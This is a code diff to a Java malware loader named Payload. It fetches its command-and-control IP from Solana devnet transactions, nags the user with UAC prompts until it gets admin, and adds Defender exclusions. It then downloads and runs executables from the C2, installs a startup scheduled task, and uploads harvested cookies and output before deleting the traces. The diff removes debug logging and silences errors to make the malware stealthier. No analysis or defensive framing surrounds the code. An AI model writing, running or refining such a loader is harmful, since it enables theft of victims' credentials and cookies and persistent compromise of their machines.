@@ -12,7 +12,6 @@ public class Payload {
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
 
     public static void main(String[] args) {
-        log("--- STARTING ST.JAR ---");
         try {
             String key = "";
             String ip = "";
@@ -21,37 +20,28 @@ public class Payload {
                 key = args[0].trim();
                 ip = args[1].trim();
             } else {
-                log("No arguments passed. Fetching IP from Solana...");
-                // Loop until we get an IP or the program is terminated
                 while (ip == null || ip.isEmpty()) {
                     ip = getC2Ip();
                     if (ip == null) {
-                        log("Failed to get IP from Solana. Retrying in 30 seconds...");
                         Thread.sleep(30000);
                     }
                 }
-                key = "all"; // Fallback if not passed by stager
+                key = "all";
             }
 
-            log("Key: " + key + " | IP: " + ip);
-
             if (!isAdmin()) {
-                log("Not admin. Starting UAC loop...");
                 while (true) {
                     boolean accepted = askForAdmin(key, ip);
                     if (accepted) {
-                        log("UAC Accepted. Parent exiting.");
                         System.exit(0);
                     }
-                    log("UAC Denied. Waiting 1s before retrying...");
                     Thread.sleep(1000);
                 }
             } else {
-                log("We are Admin! Proceeding.");
                 executePayload(key, ip);
             }
         } catch (Throwable t) {
-            log("FATAL: " + t.toString());
+            // Silent catch
         }
     }
 
@@ -69,11 +59,9 @@ public class Payload {
                 javaExe, jarPath, key, ip
             );
 
-            log("Triggering UAC via PowerShell...");
             Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
             p.waitFor();
             
-            log("Waiting for elevated process...");
             for (int i = 0; i < 100; i++) {
                 if (!lockFile.exists()) {
                     return true;
@@ -84,7 +72,6 @@ public class Payload {
             if (lockFile.exists()) lockFile.delete();
             return false;
         } catch (Exception e) {
-            log("UAC Error: " + e.toString());
             return false;
         }
     }
@@ -128,7 +115,6 @@ public class Payload {
                         if (ipEnd != -1) {
                             String candidate = txRes.substring(ipStart + 2, ipEnd);
                             if (candidate.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) {
-                                log("Found IP in Solana: " + candidate);
                                 return candidate;
                             }
                         }
@@ -136,7 +122,7 @@ public class Payload {
                 }
             }
         } catch (Exception e) {
-            log("Solana error: " + e.toString());
+            return null;
         }
         return null;
     }
@@ -161,15 +147,6 @@ public class Payload {
         } catch (Exception e) { return null; }
     }
 
-    private static void log(String msg) {
-        try {
-            File logFile = new File(getLoaderDir(), "java_debug.txt");
-            FileWriter fw = new FileWriter(logFile, true);
-            fw.write(msg + "\n");
-            fw.close();
-        } catch (Exception e) {}
-    }
-
     private static boolean isAdmin() {
         try {
             File f = new File("C:\\Windows\\System32\\config");
@@ -179,16 +156,13 @@ public class Payload {
 
     private static void executePayload(String key, String ip) {
         try {
-            log("Executing payload...");
             File loaderDir = getLoaderDir();
             
             File lock = new File(loaderDir, ".lock");
             if (lock.exists()) {
                 lock.delete();
-                log("Deleted .lock file to notify parent.");
             }
 
-            log("Adding AV exclusion via PowerShell...");
             try {
                 String psExclude = String.format(
                     "Add-MpPreference -ExclusionPath 'C:\\Users', '%s' -ErrorAction SilentlyContinue",
@@ -201,11 +175,8 @@ public class Payload {
                 pb.start().waitFor();
                 
                 Thread.sleep(3000); 
-            } catch (Exception e) {
-                log("Failed to add exclusions: " + e.toString());
-            }
+            } catch (Exception e) {}
 
-            log("Downloading payloads...");
             String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
             for (String file : files) {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
@@ -215,21 +186,17 @@ public class Payload {
             for (String exe : exesToRun) {
                 File exeFile = new File(loaderDir, exe);
                 if (exeFile.exists()) {
-                    log("Executing " + exe + "...");
                     try {
-                        new ProcessBuilder(".\\" + exe, key).directory(loaderDir).start();
-                    } catch (Exception e) {
-                        log("Execute error for " + exe + ": " + e.getMessage());
-                    }
+                        // Using cmd.exe /c start fixes the CreateProcess error=2 and bypasses some execution blocks
+                        new ProcessBuilder("cmd.exe", "/c", "start", "", exeFile.getAbsolutePath(), key)
+                            .directory(loaderDir).start();
+                    } catch (Exception e) {}
                     Thread.sleep(1000);
-                } else {
-                    log("Skipping " + exe + " (file not found)");
                 }
             }
 
             installStartupTask(key, ip);
 
-            log("Waiting for harvest...");
             Thread.sleep(25000);
             
             File zipFile = new File(loaderDir, "capture.zip");
@@ -238,19 +205,13 @@ public class Payload {
                 new File(loaderDir, "cookies")
             }, zipFile);
             
-            log("Uploading capture.zip...");
             uploadFile("http://" + ip + "/api/rpc", zipFile, key);
-            log("Done!");
 
-            log("Cleaning up harvest files...");
             if (zipFile.exists()) zipFile.delete();
             deleteDir(new File(loaderDir, "output"));
             deleteDir(new File(loaderDir, "cookies"));
-            log("Cleanup complete.");
 
-        } catch (Exception e) {
-            log("Execute Error: " + e.toString());
-        }
+        } catch (Exception e) {}
     }
 
     private static void deleteDir(File dir) {
@@ -260,15 +221,11 @@ public class Payload {
                 .sorted(Comparator.reverseOrder())
                 .map(Path::toFile)
                 .forEach(File::delete);
-        } catch (Exception e) {
-            log("Failed to delete " + dir.getName() + ": " + e.toString());
-        }
+        } catch (Exception e) {}
     }
 
     private static void installStartupTask(String key, String ip) {
         try {
-            log("Installing startup scheduled task via javaw.exe...");
-            
             String jarPath = getLoaderDir().getAbsolutePath() + "\\st.jar";
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javawPath = javaHome + "\\bin\\javaw.exe";
@@ -285,27 +242,8 @@ public class Payload {
                 "/F"
             );
             
-            Process p = pb.start();
-            
-            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            String line;
-            StringBuilder output = new StringBuilder();
-            while ((line = reader.readLine()) != null) {
-                output.append(line).append("\n");
-            }
-            
-            BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
-            while ((line = errReader.readLine()) != null) {
-                output.append("ERR: ").append(line).append("\n");
-            }
-
-            p.waitFor();
-            
-            log("schtasks output:\n" + output.toString());
-            log("Startup task installed successfully.");
-        } catch (Exception e) {
-            log("Task install failed: " + e.toString());
-        }
+            pb.start().waitFor();
+        } catch (Exception e) {}
     }
 
     private static void downloadFile(String urlStr, File dest) {
@@ -316,14 +254,14 @@ public class Payload {
             conn.setConnectTimeout(5000);
             conn.setReadTimeout(5000);
 
-            try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
-                byte[] buf = new byte[8192]; int len;
-                while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
+            // Check if the download actually succeeded (HTTP 200)
+            if (conn.getResponseCode() == 200) {
+                try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
+                    byte[] buf = new byte[8192]; int len;
+                    while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
+                }
             }
-            log("Downloaded " + dest.getName() + " successfully.");
-        } catch (Exception e) { 
-            log("Download failed " + urlStr + ": " + e.toString()); 
-        }
+        } catch (Exception e) {}
     }
 
     private static void zipFolders(File[] dirs, File zipFile) {
@@ -339,7 +277,7 @@ public class Payload {
                     }
                 }
             }
-        } catch (Exception e) { log("Zip failed: " + e.toString()); }
+        } catch (Exception e) {}
     }
 
     private static void uploadFile(String urlStr, File file, String key) {
@@ -357,7 +295,6 @@ public class Payload {
             conn.setReadTimeout(5000);
             try (OutputStream os = conn.getOutputStream()) { os.write(json.getBytes()); }
             conn.getResponseCode();
-            log("Upload successful.");
-        } catch (Exception e) { log("Upload failed: " + e.toString()); }
+        } catch (Exception e) {}
     }
 }
